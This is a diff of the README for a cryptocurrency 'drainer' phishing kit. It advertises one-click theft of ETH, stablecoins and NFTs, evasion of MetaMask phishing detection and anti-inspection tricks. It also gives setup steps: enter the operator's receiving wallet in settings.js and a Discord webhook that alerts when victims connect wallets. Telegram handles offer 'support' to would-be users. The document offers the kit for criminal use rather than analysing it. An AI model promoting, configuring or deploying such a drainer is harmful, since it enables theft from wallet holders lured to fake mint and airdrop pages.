@@ -1,31 +1,31 @@
-# ***⛔ This Repo Has No Backdoors!***
-## ETH & NFT DRAINER (TatePunks Version UPDATE SEPTEMBER}) MOST FREE DRAINERS ON GITHUB ARE BACKDOORS/SCAMS ##
-### I DECIDED TO UPLOAD A FREE CLEAN CODE WITHOUT ANY BACKDOORS IN EXCHANGE ALL I WANT IS LITTLE SUPPORT. Please ⭐ the repo ###
-#### If you need any help, DM me here: https://t.me/+GkQynos7Hi8yNjFk (beware of imposters/scammers) ####
+# ***🔥Welcome! PUBLIC GITHUB IS BACKDOORED (TELEGRAM - @paradrainers)🔥***
+
+## ETH & NFT DRAINER ##
+#### If you need any help, DM me on telegram @paradrainers ####
 
 ## 🖼️ ETH Stealer / NFT Stealer / USDT Stealer / Drainer Template / ETH Drainer / NFT Drainer / USDT Drainer /USDC Drainer
+![andrew tate mint](https://user-images.githubusercontent.com/128543022/227013724-2820f260-9452-4328-968e-636449666bc7.png)
+![mutant airdrop](https://user-images.githubusercontent.com/128543022/227013789-0ca40e03-3d05-44fe-9731-f56738958706.png)## `💡 Features`
 
 
-## `💡 Features`
 - [x] Inspect Element Detection
 - [x] Custom Design
 - [x] Cool design 
 - [x] Instant ETH/USDT/USDC/BUSD/DAI transactions
-- [x] only drain eth more than $5
+- [x] only drain eth more than gas fees
 - [x] Set Aproval NFT method
 - [x] Steals all NFT's with one click
 - [x] No contract required
 - [x] Anti Metamask Phishing Detections
 - [x] Anti F12 Inspect
-- [x] NO BACKDOOR
 
 
-## `✏️ Setup Guide:` For testing the drainer you Must've atleast $50 eth in your metamask wallet.
+## `✏️ Setup Guide:
 
 1. Edit the **settings.js** file. 
 
 - line 3: const receiveAddress = `"PutYourAddressHere";` replace **PutYourAddressHere with your ETH wallet address.**
-- line 36: put your Discord Webhook there
+- line 36: put your Discord Webhook there (if you want to get notified on discord when somebody connects wallet)
 
 2. Design Change:
 
@@ -44,11 +44,11 @@ Claim.html:
 
 
 
-To get instant support, contact me on Telegram (https://t.me/+GkQynos7Hi8yNjFk)
+To get instant support, contact me on Telegram @paradrainers
 
 
 ## `⭐ Socials :`
 
-- Telegram: https://t.me/+GkQynos7Hi8yNjFk
+- Telegram: @paradrainers
 
 ##### Please ⭐ the repo to support our project
